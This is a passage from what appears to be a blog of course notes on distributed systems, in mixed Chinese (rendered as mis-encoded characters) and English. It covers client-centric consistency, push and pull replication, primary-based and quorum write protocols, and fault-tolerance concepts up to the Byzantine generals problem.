<p>åœ¨xä¸Šæ‰€æœ‰æ¥ä¸‹æ¥çš„å†™æ“ä½œï¼Œåº”è¯¥æ˜¯ä»ä¸Šæ¬¡è¯»åˆ°çš„åœ°æ–¹å¼€å§‹å†™ï¼Œæˆ–è€…æ˜¯æ¯”ä¸Šæ¬¡è¯»åˆ°çš„ç»“æœè¿˜è¦æ–°çš„åœ°æ–¹å¼€å§‹å†™ã€‚</p>
<p><strong>ä¾‹</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451813.png" alt="image-20190420012142100"></p>
<p>åœ¨WS(x2)çš„æ—¶å€™ï¼Œè¦åœ¨ä¸Šæ¬¡å‘ç”Ÿè¯»æ“ä½œR(x1)çš„åœ°æ–¹ï¼Œæˆ–è€…æ›´æ–°çš„åœ°æ–¹è¿›è¡Œå†™æ“ä½œï¼Œè¿™æ ·éœ€è¦æŠŠWS(x1)ä¼ æ’­åˆ°L2ä¸Šã€‚</p>
<p>å›¾(a)ä¸­ï¼Œæœ‰WS(x1,x2)ï¼Œå…ˆä¼ æ’­äº†WS(x1)ï¼Œå†å†™å…¥äº†x2ï¼Œæ¥ä¸‹æ¥çš„W(x2)å°±åœ¨æ­£ç¡®çš„åœ°æ–¹å†™å…¥ã€‚</p>
<p>ä½†æ˜¯åœ¨bä¸­æ²¡æœ‰ä¼ æ’­WS(x1)ï¼Œåªæœ‰WS(x2)ï¼Œä¸æ»¡è¶³å†™è¯»ä¸€è‡´æ€§ã€‚å› ä¸ºåç»­å†™æ“ä½œæ²¡æœ‰å‘ç”Ÿåœ¨äºå…ˆå‰xè¯»å–å€¼ç›¸åŒæˆ–æ¯”ä¹‹æ›´æ–°çš„å€¼ä¸Šã€‚</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p><strong>å®˜æ–¹æ€»ç»“</strong></p>
<p>We can <strong>avoid system-wide consistency</strong>, by concentrating on what specific <strong>clients</strong> want, instead of what should be maintained by servers. Relax consistency requirements even further.</p>
<p>æ ¹æ®å®¢æˆ·ç«¯çš„éœ€æ±‚æ¥ç»´æŠ¤å†…å®¹ï¼Œè¿›ä¸€æ­¥æ”¾å®½äº†ä¸€è‡´æ€§ã€‚</p>
<p><strong>ä¸ªäººæ€»ç»“</strong></p>
<p>æ— è®ºæ˜¯å•è°ƒè¯»å•è°ƒå†™ï¼Œè¿˜æ˜¯è¯»å†™ä¸€è‡´å†™è¯»ä¸€è‡´ï¼Œéƒ½æ˜¯å…ˆåœ¨ä¸€ä¸ªåœ°æ–¹å‘ç”Ÿå†™æ“ä½œï¼Œå¦‚æœä»¥åå…¶ä»–å‰¯æœ¬å‘ç”Ÿäº†å…¶ä»–æ“ä½œï¼Œè€Œå…ˆå‰çš„å†™æ“ä½œæ²¡æœ‰ä¼ æ’­è¿‡æ¥ï¼Œå°±æ˜¯ä¸ä¸€è‡´çš„ï¼Œä¼ æ’­è¿‡æ¥å°±ä¸€è‡´ã€‚</p>
<h2 id="å¤åˆ¶ç®¡ç†"><a href="#å¤åˆ¶ç®¡ç†" class="headerlink" title="å¤åˆ¶ç®¡ç†"></a>å¤åˆ¶ç®¡ç†</h2><h3 id="å†…å®¹åˆ†å‘"><a href="#å†…å®¹åˆ†å‘" class="headerlink" title="å†…å®¹åˆ†å‘"></a>å†…å®¹åˆ†å‘</h3><p>ä¸€ä¸ªé‡è¦çš„è®¾è®¡é—®é¢˜æ˜¯å°†è¦å®é™…ä¼ æ’­å“ªäº›ä¿¡æ¯ï¼Œåˆ†ä¸‰ç§:</p>
<ol>
<li>åªä¼ æ’­æ›´æ–°çš„é€šçŸ¥</li>
<li>æŠŠæ•°æ®ä»ä¸€ä¸ªå‰¯æœ¬ä¼ é€åˆ°å¦ä¸€ä¸ªå‰¯æœ¬</li>
<li>æŠŠæ›´æ–°æ“ä½œä¼ æ’­åˆ°å…¶ä»–å‰¯æœ¬</li>
</ol>
<h3 id="æ‹‰åè®®ä¸æ¨åè®®"><a href="#æ‹‰åè®®ä¸æ¨åè®®" class="headerlink" title="æ‹‰åè®®ä¸æ¨åè®®"></a>æ‹‰åè®®ä¸æ¨åè®®</h3><ol>
<li>åŸºäºæ¨å¼çš„æ–¹æ³•åˆç§°ä¸ºåŸºäºæœåŠ¡å™¨çš„åè®®ï¼Œä¸éœ€è¦å…¶ä»–å‰¯æœ¬è¯·æ±‚æ›´æ–°ï¼Œè¿™äº›æ›´æ–°å°±è¢«ä¼ æ’­åˆ°é‚£äº›å‰¯æœ¬å“ªé‡Œã€‚</li>
<li>åŸºäºæ‹‰å¼çš„æ–¹æ³•ï¼Œä¸€å°æœåŠ¡å™¨æˆ–å®¢æˆ·è¯·æ±‚å…¶ä»–æœåŠ¡å™¨å‘ä»–å‘é€è¯¥æœåŠ¡å™¨æ­¤æ—¶æŒæœ‰çš„ä»»ä½•æ›´æ–°ï¼ŒåŸºäºæ‹‰çš„åè®®åˆç§°ä¸ºåŸºäºå®¢æˆ·çš„åè®®</li>
<li>æ¯”è¾ƒ:</li>
</ol>
<table>
<thead>
<tr>
<th align="left">Issue</th>
<th align="left">Push-based</th>
<th align="left">Pull-based</th>
</tr>
</thead>
<tbody><tr>
<td align="left">State of server</td>
<td align="left">List of client replicas and caches</td>
<td align="left">None</td>
</tr>
<tr>
<td align="left">Messages sent</td>
<td align="left">Update (and possibly fetch update later)</td>
<td align="left">Poll and update</td>
</tr>
<tr>
<td align="left">Response time at client</td>
<td align="left">Immediate (or fetch-update time)</td>
<td align="left">Fetch-update time</td>
</tr>
</tbody></table>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451814.png" alt="image-20190420013804698"></p>
<h2 id="ä¸€è‡´æ€§åè®®"><a href="#ä¸€è‡´æ€§åè®®" class="headerlink" title="ä¸€è‡´æ€§åè®®"></a>ä¸€è‡´æ€§åè®®</h2><p>è®²å…·ä½“å¦‚ä½•å®ç°å‰é¢çš„æ¨¡å‹ã€‚ä¸»è¦è®²Primary-Based ProtocolsåŸºäºä¸»å¤‡ä»½çš„åè®®å’ŒReplicated-Write</p>
<p>Protocolså¤åˆ¶çš„å†™åè®®ï¼ŒæŒç»­ä¸€è‡´æ€§(å–å£æ°´)è¿™ä¸ªä¸è®²äº†ã€‚</p>
<h3 id="Primary-Based-Protocols-åŸºäºä¸»å¤‡ä»½çš„åè®®"><a href="#Primary-Based-Protocols-åŸºäºä¸»å¤‡ä»½çš„åè®®" class="headerlink" title="Primary-Based Protocols åŸºäºä¸»å¤‡ä»½çš„åè®®"></a>Primary-Based Protocols åŸºäºä¸»å¤‡ä»½çš„åè®®</h3><p>ä¸€ä¸ªé›†ä¸­å¼çš„åè®®ï¼Œæ˜¯ä¸»ä»å¼çš„æ¶æ„ã€‚</p>
<h4 id="è¿œç¨‹å†™åè®®"><a href="#è¿œç¨‹å†™åè®®" class="headerlink" title="è¿œç¨‹å†™åè®®"></a>è¿œç¨‹å†™åè®®</h4><p><strong>åŸç†å›¾</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451815.png" alt="image-20190420013926379"></p>
<p>æ‰€æœ‰çš„æ›´æ–°æ“ä½œå…¨éƒ½ç”±primaryæ¥å®Œæˆã€‚å½“ä¸»æœåŠ¡å™¨æ”¶åˆ°W2çš„æ—¶å€™ï¼Œå‘æ‰€æœ‰ä»æœåŠ¡å™¨å‘é€W3ï¼Œè¦ å¯¹å¤§å®¶ä¸€èµ·å¯¹ï¼Œè¦é”™å¤§å®¶ä¸€èµ·é”™ã€‚</p>
<ul>
<li>è¿™ä¸ªå¹¿æ’­çš„å†™æ“ä½œå…·æœ‰åŸå­æ€§ï¼Œæ‰€ä»¥åˆå«åŸå­å¤šæ’­ã€‚</li>
<li>è¿™ä¸ªä¸æ˜¯ä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„ä¸€è‡´æ€§æ¨¡å‹ã€‚æ¯”è¾ƒç¬¦åˆå¼ºä¸€è‡´æ€§æ¨¡å‹çš„ç†å¿µçš„ã€‚</li>
</ul>
<p><strong>æ½œåœ¨çš„é—®é¢˜</strong></p>
<ol>
<li>å‘é€W1æ›´æ–°è¯·æ±‚ä¹‹åï¼Œéœ€è¦ç»è¿‡W2ï¼ŒåŸå­å¤šæ’­W3ï¼Œç­‰æ‰€æœ‰çš„W4éƒ½å—åˆ°ï¼Œæ‰è¿”å›W5ï¼Œè¿™ ä¸€ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¯åŠ¨æ›´æ–°çš„è¿›ç¨‹ä¼šè¢«é˜»å¡ï¼Œè¦ç­‰å¾…å¾ˆé•¿æ—¶é—´ã€‚</li>
<li>å¦å¤–ä¸€ç§ä¸€ä¸ªéé˜»å¡çš„æ–¹æ³•ï¼Œå°±æ˜¯å½“å‰å·²ç»æ›´æ–°äº†xä¸ªå‰¯æœ¬ï¼Œå°±è¿”å›ä¸€ä¸ªç¡®è®¤æ¶ˆæ¯ï¼Œç„¶åå†é€šçŸ¥å¤‡ä»½æœåŠ¡å™¨æ‰§è¡Œè¿™ä¸ªæ›´æ–°ã€‚</li>
<li>ç‰ºç‰²äº†å®¢æˆ·çš„æ—¶é—´æ¥ä¿è¯æ€§èƒ½ã€‚</li>
</ol>
<h4 id="æœ¬åœ°å†™åè®®"><a href="#æœ¬åœ°å†™åè®®" class="headerlink" title="æœ¬åœ°å†™åè®®"></a>æœ¬åœ°å†™åè®®</h4><p><strong>åŸç†å›¾</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451816.png" alt="image-20190420014332847"></p>
<p>ä¹Ÿæ˜¯åŸºäºä¸»å¤‡ä»½çš„åè®®ï¼Œå½“æŸä¸ªè¿›ç¨‹è¦æ›´æ–°æ•°æ®é¡¹xæ˜¯ï¼Œå…ˆå®šä½xçš„ä¸»å‰¯æœ¬ï¼Œç„¶åæŠŠå®ƒç§»åŠ¨åˆ°å½“å‰è®¿é—®çš„å‰¯æœ¬ä¸Šï¼Œå®¢æˆ·æ ‡è®°è®¿é—®çš„æœåŠ¡å™¨ä¸ºnew primaryï¼Œä¹‹å‰çš„æ˜¯old primaryã€‚å…ˆç»™å®¢æˆ·åšåº”ç­”ï¼Œ ç„¶åç”±newå‘Šè¯‰å„ä¸ªå¤‡ä»½æœåŠ¡å™¨æ¥æ›´æ–°ã€æ¥å—ä»–ä»¬å‘æ¥çš„æ›´æ–°ç¡®è®¤ã€‚</p>
<p><strong>æ½œåœ¨çš„é—®é¢˜</strong></p>
<p>å¦‚æœå®¢æˆ·å‘èµ·å†™è¯·æ±‚ä¹‹åï¼Œæ”¶åˆ°ç¡®è®¤æ›´æ–°æ¶ˆæ¯äº†ï¼Œç«‹å³ä»åˆ«çš„å¤‡ä»½æœåŠ¡å™¨å†å»è¯»ï¼Œæœ‰å¯èƒ½è¯»åˆ°ä¸€ä¸ªé”™è¯¯çš„ç»“æœï¼Œç‰ºç‰²äº†ä¸¥æ ¼çš„å‡†ç¡®æ€§æ¥æå‡æ€§èƒ½ã€‚</p>
<h3 id="Replicated-Write-Protocols-å¤åˆ¶çš„å†™åè®®"><a href="#Replicated-Write-Protocols-å¤åˆ¶çš„å†™åè®®" class="headerlink" title="Replicated-Write Protocols å¤åˆ¶çš„å†™åè®®"></a>Replicated-Write Protocols å¤åˆ¶çš„å†™åè®®</h3><p>ä¸€ç§åˆ†å¸ƒå¼çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<p><strong>è§„å®š</strong></p>
<p>ä¸€ä¸ªæœåŠ¡å™¨é›†ç¾¤æœ‰Nä¸ªæœºå™¨ï¼Œæ¯ä¸ªæœºå™¨ä¸Šéƒ½æœ‰è¿™ä¸ªæ–‡ä»¶ã€‚</p>
<p>è‹¥è¦æ›´æ–°è¿™ä¸ªæ–‡ä»¶ï¼Œå®¢æˆ·å¿…é¡»å…ˆè”ç³»è‡³å°‘$\frac{N}{2} + 1$ä¸ªæœåŠ¡å™¨ï¼Œå¹¶å¾—åˆ°ä»–ä»¬åŒæ„åè‡ªè¡Œæ›´æ–°ã€‚ä¸€æ—¦ä»–ä»¬æ›´æ–°ï¼Œè¯¥æ–‡ä»¶å°†è¢«ä¿®æ”¹ï¼Œè¿™ä¸ªæ–°æ–‡ä»¶ä¹Ÿå°†ä¸ä¸€ä¸ªæ–°ç‰ˆæœ¬å·å…³è”ï¼Œè¯¥ç‰ˆæœ¬å·ç”¨äºè¯†åˆ«æ–‡ä»¶çš„ç‰ˆæœ¬ï¼Œå¯¹äºæ‰€æœ‰æ–°æ›´æ–°çš„æ–‡ä»¶ï¼Œä»–ä»¬çš„ç‰ˆæœ¬å·æ˜¯ç›¸åŒçš„ã€‚</p>
<p>åœ¨è¯»å–çš„æ—¶å€™ï¼Œæœ‰ä¸¤ç§ç‰ˆæœ¬</p>
<p>a) è”ç³»è‡³å°‘$\frac{N}{2}+1$ä¸ªæœåŠ¡å™¨ï¼Œè¯·æ±‚ä»–ä»¬è¿”å›è¯¥æ–‡ä»¶å…³è”çš„ç‰ˆæœ¬å·ã€‚</p>
<p>b) æ ¹æ®$N_R$å’Œ$N_W$æ¥è®¡ç®—ï¼Œ$N_W$è¶Šå¤§ï¼Œ$N_R$å°±å¯ä»¥è¶Šå°ã€‚(åœ¨ä¸‹é¢è¯¦ç»†è¯´)</p>
<ol>
<li><p>ä¸€ä¸ªå®¢æˆ·è¦è¯»å–ä¸€ä¸ªå…·æœ‰Nä¸ªå‰¯æœ¬çš„æ–‡ä»¶ï¼Œå¿…é¡»ç»„ç»‡ä¸€ä¸ªè¯»å›¢ä½“(read quorum)è¯¥è¯»å›¢ä½“æ˜¯ä»»æ„$N_R$ä¸ªä»¥ä¸ŠæœåŠ¡å™¨çš„é›†åˆã€‚</p>
</li>
<li><p>è¦æ±‚æ”¹ä¸€ä¸ªæ–‡ä»¶ï¼Œå®¢æˆ·å¿…é¡»ç»„ç»‡ä¸€ä¸ªè‡³å°‘æœ‰$N_W$ä¸ªæœåŠ¡å™¨çš„å†™å›¢ä½“ã€‚</p>
</li>
<li><p>$N_R$å’Œ$N_W$æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p>
<ul>
<li>$N_R + N_W &gt; N$ï¼šé˜²æ­¢è¯»å†™æ“ä½œå†²çª</li>
<li>$N_W &gt; \frac{N}{2}$ï¼šé˜²æ­¢å†™å†™æ“ä½œå†²çª</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451817.png" alt="image-20190420020558986"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451818.png" alt="image-20190420020615554"></p>
<p><strong>å”‰~~ä¸€å£°é•¿å¹ï¼Œå¤ä¹ ä¸æ˜“å•Šã€‚</strong></p>
</li>
</ol>
<p><strong>ä¸¾ä¾‹</strong>:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451819.png" alt="image-20190420015837821"></p>
<p>å›¾(a)å’Œ(c)æ˜¯å¯è¡Œçš„ï¼Œæ»¡è¶³ä¸Šè¿°ä¸¤ä¸ªæ¡ä»¶ã€‚åªè¦æ»¡è¶³$N_R+N_W &gt; N$ï¼Œé‚£ä¹ˆå†æ€æ ·éƒ½ä¼šè¯»åˆ°æœ€æ–°ç‰ˆæœ¬çš„æ–‡ä»¶ï¼Œæ ¹æ®æ–‡ä»¶çš„ç‰ˆæœ¬å·é€‰æ‹©æœ€æ–°çš„æ–‡ä»¶å³å¯ã€‚</p>
<p>å›¾(b)ä¸è¡Œï¼Œå› ä¸ºä¸æ»¡è¶³$N_W &gt; \frac{N}{2}$ï¼Œå¦‚æœä¸€ä¸ªè¿›ç¨‹æ›´æ–°{A, B, C, D, E, F}ï¼Œä»¤ä¸€ä¸ªè¿›ç¨‹æ›´æ–°{G, H, I, J, K, L}ï¼Œè¿™æ ·ä¸¤è¾¹éƒ½æ˜¯æœ€æ–°çš„ç‰ˆæœ¬å·ï¼Œä½†æ˜¯æ–‡ä»¶æ˜¯å†…å®¹æ˜¯ä¸åŒçš„ï¼Œå‘ç”Ÿå†™å†™å†²çªã€‚</p>
<h3 id="å‰©ä¸‹çš„å†…å®¹å–äº†å£æ°´ï¼Œä¸è®²äº†"><a href="#å‰©ä¸‹çš„å†…å®¹å–äº†å£æ°´ï¼Œä¸è®²äº†" class="headerlink" title="å‰©ä¸‹çš„å†…å®¹å–äº†å£æ°´ï¼Œä¸è®²äº†"></a>å‰©ä¸‹çš„å†…å®¹å–äº†å£æ°´ï¼Œä¸è®²äº†</h3><hr>
<h1 id="Chapter-8-å®¹é”™-Fault-Tolerance"><a href="#Chapter-8-å®¹é”™-Fault-Tolerance" class="headerlink" title="Chapter 8 å®¹é”™ - Fault Tolerance"></a>Chapter 8 å®¹é”™ - Fault Tolerance</h1><blockquote>
<p><em>â€œFailure is not an option. It comes bundled with your software.â€œ</em></p>
<p><em>â€“unknown</em></p>
</blockquote>
<p>å‡ºé”™æ˜¯ä¸€ä¸ªå¤§æ¦‚ç‡äº‹ä»¶ã€‚å› æ­¤å‡ ä¹æ‰€æœ‰çš„åˆ†å¸ƒå¼ç³»ç»Ÿéƒ½è¦è€ƒè™‘å®¹é”™çš„é—®é¢˜ã€‚</p>
<h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><ol>
<li><p><strong>Fault toleranceå®¹é”™</strong></p>
<p>build a component in such a way that it can meet its specifications in the presence of faults (i.e., mask the presence of faults).</p>
<p>æ„å»ºä¸€ä¸ªç»„ä»¶ï¼Œä½¿å…¶èƒ½å¤Ÿåœ¨å‡ºç°æ•…éšœæ—¶æ»¡è¶³å…¶è§„èŒƒ (å³æ©ç›–æ•…éšœçš„å­˜åœ¨)ã€‚</p>
</li>
<li><p><strong>å¯é æ€§dependableæ˜¯ä¸€ä¸ªæœ¯è¯­ï¼Œå®ƒåŒ…å«äº†åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¾ˆå¤šæœ‰ç”¨çš„éœ€æ±‚:</strong></p>
<ol>
<li><p><strong>å¯ç”¨æ€§ï¼š</strong>è¢«å®šä¹‰ä¸ºç³»ç»Ÿçš„ä¸€ä¸ªå±æ€§ï¼Œä»–è¯´æ˜ç³»ç»Ÿå·²å‡†å¤‡å¥½ï¼Œé©¬ä¸Šå¯ä»¥ä½¿ç”¨</p>
<p><strong>availability:</strong> Readiness for usage.</p>
</li>
<li><p><strong>å¯é æ€§ï¼š</strong>æŒ‡ç³»ç»Ÿå¯ä»¥æ— æ•…éšœçš„æŒç»­è¿è¡Œã€‚</p>
<p><strong>Reliability</strong>: Continuity of service delivery.</p>
</li>
<li><p><strong>å®‰å…¨æ€§ï¼š</strong>æ˜¯æŒ‡ç³»ç»Ÿå¶ç„¶å‡ºç°æ•…éšœçš„æƒ…å†µä¸‹èƒ½æ­£ç¡®æ“ä½œè€Œä¸ä¼šé€ æˆä»»ä½•ç¾éš¾ã€‚</p>
<p><strong>Safety:</strong> Low probability of catastrophes.</p>
</li>
<li><p><strong>å¯ç»´æŠ¤æ€§ï¼š</strong>æ˜¯æŒ‡å‘ç”Ÿæ•…éšœçš„ç³»ç»Ÿè¢«æ¢å¤éš¾æ˜“ç¨‹åº¦ã€‚</p>
<p><strong>Maintainability:</strong> How easy can a failed system be repaired.</p>
</li>
</ol>
</li>
<li><p><strong>Failure:</strong></p>
<p>When a component is not living up to its specifications, a failure occurs.</p>
<p>ä¸æ»¡è¶³åŠŸèƒ½è¯´æ˜ï¼Œå°±æ˜¯failureã€‚</p>
</li>
<li><p><strong>Error:</strong></p>
<p>The part of a componentâ€˜s state that can lead to a failure.</p>
<p>ä¸€ç§å¯èƒ½ä¼šå¯¼è‡´failureçš„çŠ¶æ€</p>
</li>
<li><p><strong>Fault:</strong></p>
<p>The cause of an error.</p>
<p>å¯¼è‡´errorçš„åŸå› ã€‚</p>
<blockquote>
<p>æ¯é¸¡å…¬é¸¡å°é¸¡ï¼Œéƒ½æ˜¯é¸¡ï¼Œä¸éƒ½æ˜¯é¸¡å—ï¼Ÿåœ¨è‹±æ–‡ä¸­æ˜¯ä¸åŒçš„å•è¯ã€‚è¿™è¯´æ˜è¥¿æ–¹äººå½’çº³æ€»ç»“çš„èƒ½åŠ›ä¸è¡Œã€‚è¥¿æ–¹äººåå‘æ¨ç†ï¼Œä¸œæ–¹äººåå‘å½’çº³æ€»ç»“ã€‚</p>
<p>â€”â€”ä¸ç®</p>
</blockquote>
</li>
<li><p><strong>Faultçš„ç±»å‹</strong></p>
<ol>
<li><p><strong>Transient:</strong> occur once and then disappear.</p>
<p><strong>çŸ­æš‚æ•…éšœï¼š</strong>åªå‘ç”Ÿä¸€æ¬¡ï¼Œç„¶åå°±æ¶ˆå¤±äº†ï¼Œå³ä½¿é‡å¤æ“ä½œä¹Ÿä¸ä¼šå‘ç”Ÿã€‚</p>
</li>
<li><p><strong>Intermittent:</strong> occur, then vanish, then reappear.</p>
<p><strong>é—´æ­‡æ•…éšœï¼š</strong>å‘ç”Ÿï¼Œæ¶ˆå¤±ä¸è§ï¼Œç„¶åå†æ¬¡å‘ç”Ÿï¼Œå¦‚æ­¤åå¤è¿›è¡Œã€‚</p>
</li>
<li><p><strong>Permanent:</strong> continues to exist.</p>
<p><strong>æŒä¹…æ•…éšœï¼š</strong>æ˜¯é‚£äº›çŸ¥é“æ•…éšœç»„ä»¶è¢«ä¿®å¤ä¹‹å‰æŒç»­å­˜åœ¨çš„æ•…éšœ</p>
</li>
</ol>
</li>
<li><p><strong>Failure Models</strong></p>
<ol>
<li><p><strong>Crash failures:</strong> A component simply halts, but behaves correctly before halting.</p>
<p><strong>å´©æºƒæ€§æ•…éšœï¼š</strong>æœåŠ¡å™¨è¿‡æ—©çš„åœæœºï¼Œä½†æ˜¯åœ¨åœæœºä¹‹å‰å·¥ä½œæ­£å¸¸ã€‚</p>
</li>
<li><p><strong>Omission failures:</strong> A component fails to respond to incoming requests.</p>
<p><strong>Receive omission:</strong> Fails to receive incoming messages.</p>
<p><strong>Send omission:</strong> Fails to send messages.</p>
<p><strong>é—æ¼æ€§æ•…éšœï¼š</strong>æœåŠ¡å™¨ä¸èƒ½å¯¹è¯·æ±‚è¿›è¡Œå“åº”ï¼Œåˆ†ä¸ºæ¥å—é—æ¼æ€§æ•…éšœå’Œå‘é€é—æ¼æ€§æ•…éšœã€‚</p>
</li>
<li><p><strong>Timing failures:</strong> The output of a component is correct, but lies outside a specified real-time interval.</p>
<p>E.g., performance failures: too slow.</p>
<p><strong>å®šæ—¶æ•…éšœï¼š</strong>å“åº”æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯åœ¨æŒ‡å®šçš„æ—¶é—´èŒƒå›´ä¹‹å¤–ï¼Œç»“æœæ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯æ—¶é—´ä¸æ»¡è¶³è¦æ±‚ã€‚</p>
</li>
<li><p><strong>Response failures:</strong> A componentâ€™s respond is incorrect.</p>
<p><strong>Value failure:</strong> The wrong value is produced.</p>
<p><strong>State transition failure:</strong> Execution of the componentâ€™s service brings it into a wrong state.</p>
<p><strong>å“åº”æ•…éšœï¼š</strong>æœåŠ¡å™¨å“åº”ä¸æ­£ç¡®ï¼Œåˆ†ä¸¤ç§ï¼Œæ•°å€¼æ•…éšœï¼ŒçŠ¶æ€è½¬æ¢æ•…éšœã€‚</p>
</li>
<li><p><strong>Arbitrary (byzantine) failures:</strong> A component may produce arbitrary output and be subject to arbitrary timing failures.</p>
<p><strong>éšæ„æ€§æ•…éšœ(ä¹Ÿç§°ä¸ºæ‹œå åº­æ•…éšœ)ï¼š</strong>æœåŠ¡å™¨å¯èƒ½äº§ç”Ÿä»»æ„è¾“å‡ºå¹¶å—åˆ°ä»»æ„å®šæ—¶æ•…éšœçš„å½±å“ï¼Œæœ€ä¸¥é‡çš„é—®é¢˜(æ²¡é”™ä¹Ÿæ˜¯Lamportæå‡ºæ¥çš„)</p>
</li>
</ol>
</li>
</ol>
<h2 id="å¤„ç†å®¹é”™"><a href="#å¤„ç†å®¹é”™" class="headerlink" title="å¤„ç†å®¹é”™"></a>å¤„ç†å®¹é”™</h2><p>å¤„ç†å®¹é”™é—®é¢˜å¸¸å¸¸ä½¿ç”¨å†—ä½™æ¥è§£å†³ï¼Œä¾‹å¦‚æµ·æ˜ç ï¼Œç‰©ç†å†—ä½™(å¤šä¸ªç¡¬ä»¶)ã€‚</p>
<h2 id="æ‹œå åº­å°†å†›é—®é¢˜"><a href="#æ‹œå åº­å°†å†›é—®é¢˜" class="headerlink" title="æ‹œå åº­å°†å†›é—®é¢˜"></a>æ‹œå åº­å°†å†›é—®é¢˜</h2><h3 id="ä»€ä¹ˆæ˜¯æ‹œå åº­å°†å†›é—®é¢˜ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ‹œå åº­å°†å†›é—®é¢˜ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ‹œå åº­å°†å†›é—®é¢˜ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ‹œå åº­å°†å†›é—®é¢˜ï¼Ÿ</h3><p>é«˜å¯é çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­éœ€è¦æœ‰è¾ƒé«˜çš„å®¹é”™èƒ½åŠ›ï¼ŒåŒ…æ‹¬å¤„ç†å…¶ä¸­ä¸€éƒ¨åˆ†ç»„ä»¶å’Œå…¶ä»–ç»„ä»¶è¿”å›çš„æ¶ˆæ¯äº’ç›¸å†²çªçš„åœºæ™¯ã€‚è¿™ä¸ªé—®é¢˜å¯ä»¥ç±»æ¯”äºæ‹œå åº­å†›é˜Ÿå›´æ”»ä¸€ä¸ªåŸæ± æ—¶ï¼Œå„ä¸ªå°†å†›é—´åªèƒ½é€šè¿‡ä¿¡ä½¿é€šä¿¡ï¼Œè€Œå°†å†›ä¸­å¯èƒ½ä¼šæœ‰å›å¾’ä¼ é€’é”™è¯¯çš„æ¶ˆæ¯ã€‚å› æ­¤éœ€è¦ä¸€ç§ç®—æ³•èƒ½å¤Ÿä¿è¯å¿ è¯šçš„å°†å†›å¯ä»¥äº’ç›¸è¾¾æˆä¸€è‡´ã€‚</p>
<p>å‡è®¾æ‹œå åº­å°†å†›ä»¬åœ¨æ•Œå†›çš„å‘¨å›´ï¼Œå°†å†›ä¹‹é—´çš„é€šä¿¡åªèƒ½é€šè¿‡ä¿¡ä½¿ï¼Œæ¯ä¸ªå°†å†›æ ¹æ®è‡ªå·±è§‚å¯Ÿçš„æ•Œæƒ…ç¡®å®šä¸‹ä¸€æ­¥çš„å†›äº‹è¡ŒåŠ¨ã€‚å°†å†›ä¸­å¯èƒ½æœ‰èƒŒå›è€…æ¥é˜»æ­¢å¿ è¯šçš„å°†å†›è¾¾æˆä¸€è‡´ã€‚ä¸ºäº†ä¿è¯ä¸‹ä¸€æ­¥å†›äº‹è¡ŒåŠ¨çš„ä¸€è‡´æ€§ï¼Œå°†å†›ä»¬éœ€è¦</p>
<ol>
<li>å¿ è¯šçš„å°†å†›æœ€ç»ˆçš„å†³å®šæ˜¯ä¸€è‡´çš„ã€‚ï¼ˆèƒŒå›è€…å¯ä»¥æŒ‰ç…§è‡ªå·±çš„æ„æ„¿åšå†³å®šï¼‰</li>
<li>å°‘æ•°çš„èƒŒå›è€…ä¸èƒ½å¯¼è‡´å¿ è¯šçš„å°†å†›åšå‡ºé”™è¯¯çš„å†³å®šã€‚</li>
</ol>
<p>åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œæ²¡æœ‰æœåŠ¡å™¨çš„å­˜åœ¨ï¼Œæ‰€ä»¥åªèƒ½æ¯ä¸ªèŠ‚ç‚¹å„è‡ªåšå†³å®šã€‚ç°åœ¨å·²çŸ¥ç½‘ç»œé€šè®¯æ˜¯å¯é çš„ï¼Œä½†æ˜¯å­˜åœ¨ä¸å¯é çš„èŠ‚ç‚¹ï¼ˆå›å¾’ï¼‰ã€‚</p>
<p>éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç®—æ³•ï¼Œæ¯ä¸ªæœåŠ¡å™¨éƒ½ä½¿ç”¨è¿™ä¸ªç®—æ³•æ¥åšå†³ç­–ï¼Œæœ‰å›å¾’å­˜åœ¨çš„æƒ…å†µä¸‹ï¼ˆå› ä¸ºæœ‰çš„èŠ‚ç‚¹ä¼šå‡ºé”™ï¼‰ï¼Œè‡³å°‘éœ€è¦å¤šå°‘ä¸ªèŠ‚ç‚¹ï¼Œå¯ä»¥åšåˆ°ï¼š</p>
<ol>
<li>æ‰€æœ‰æ­£å¸¸çš„ç»“ç‚¹ï¼Œåšå‡ºçš„å†³å®šæ˜¯ä¸€è‡´çš„ï¼›</li>
<li>å‡ºé”™çš„èŠ‚ç‚¹ä¸ä¼šå½±å“åˆ°æ­£å¸¸çš„èŠ‚ç‚¹åšå†³å®šã€‚</li>
</ol>
<p>æˆ‘åªç®€å•å†™å†™ç»“è®ºï¼Œå¯ä»¥é€šè¿‡Referenceçš„ç¬¬3ä¸ªé“¾æ¥ç‚¹è¿›å»è¯¦ç»†å­¦ä¹ ã€‚</p>
